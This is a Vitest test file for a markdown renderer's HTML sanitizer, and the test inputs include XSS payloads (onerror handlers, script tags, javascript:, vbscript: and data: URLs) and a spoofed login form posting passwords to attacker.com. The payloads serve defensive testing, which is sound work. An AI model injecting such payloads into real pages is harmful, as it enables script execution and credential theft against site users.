// @vitest-environment jsdom
import { test, expect } from 'vitest';
import { renderMarkdown } from './markdown';

test('strips script and event-handler payloads', () => {
  const out = renderMarkdown(
    '<img src=x onerror=alert(1)>\n\n<script>alert(2)</script>',
  );
  expect(out.toLowerCase()).not.toContain('onerror');
  expect(out.toLowerCase()).not.toContain('<script');
});

test('strips javascript: URLs in links', () => {
  const out = renderMarkdown('[click](javascript:alert(1))');
  expect(out.toLowerCase()).not.toContain('javascript:');
});

test('strips vbscript: URLs in links', () => {
  const out = renderMarkdown('[click](vbscript:msgbox(1))');
  expect(out.toLowerCase()).not.toContain('vbscript:');
});

test('leaves link decoration off anchors whose href was stripped', () => {
  const out = renderMarkdown('[click](javascript:alert(1))');
  expect(out).not.toContain('target="_blank"');
  expect(out).not.toContain('noopener');
});

test('strips data: URLs in links', () => {
  const out = renderMarkdown(
    '[click](data:text/html,<script>alert(1)</script>)',
  );
  expect(out.toLowerCase()).not.toContain('data:text/html');
});

test('adds target="_blank" and rel="noopener noreferrer" to links', () => {
  const out = renderMarkdown('[example](https://example.com)');
  expect(out).toContain('target="_blank"');
  expect(out).toContain('rel="noopener noreferrer"');
});

test('keeps benign markdown formatting', () => {
  const out = renderMarkdown('**bold** and `code`');
  expect(out).toContain('<strong>');
  expect(out).toContain('<code>');
});

test('syntax highlights SQL fenced code blocks', () => {
  const out = renderMarkdown(
    "```sql\nSELECT name FROM users WHERE id = 1 AND name = 'Ada';\n```",
  );

  expect(out).toContain('<code class="language-sql">');
  expect(out).toContain('<span class="tok-keyword">SELECT</span>');
  expect(out).toContain('<span class="tok-string">\'Ada\'</span>');
  expect(out).toContain('<span class="tok-number">1</span>');
});

test('escapes SQL fenced code before adding token markup', () => {
  const out = renderMarkdown(
    "```sql\nSELECT '<img src=x onerror=alert(1)>' AS payload;\n```",
  );

  expect(out).not.toContain('<img src=x');
  expect(out).toContain('&lt;img src=x onerror=alert(1)&gt;');
});

test('strips HTML forms, buttons, and non-checkbox inputs to prevent UI spoofing', () => {
  const payload = `
<form action="https://attacker.com/login" method="POST">
  <input type="text" name="user" placeholder="Username" />
  <input type="password" name="pass" placeholder="Password" />
  <button type="submit">Submit</button>
</form>
`;
  const out = renderMarkdown(payload);
  expect(out.toLowerCase()).not.toContain('<form');
  expect(out.toLowerCase()).not.toContain('type="text"');
  expect(out.toLowerCase()).not.toContain('type="password"');
  expect(out.toLowerCase()).not.toContain('<button');
});

test('preserves GFM task list checkboxes', () => {
  const out = renderMarkdown('- [ ] Todo item\n- [x] Done item');
  expect(out).toContain('type="checkbox"');
  expect(out).toContain('Todo item');
  expect(out).toContain('Done item');
});

test('strips autofocus attributes from elements to prevent focus hijacking', () => {
  const out = renderMarkdown(
    '<input type="checkbox" autofocus /><a href="https://example.com" autofocus>link</a>',
  );
  expect(out.toLowerCase()).not.toContain('autofocus');
});
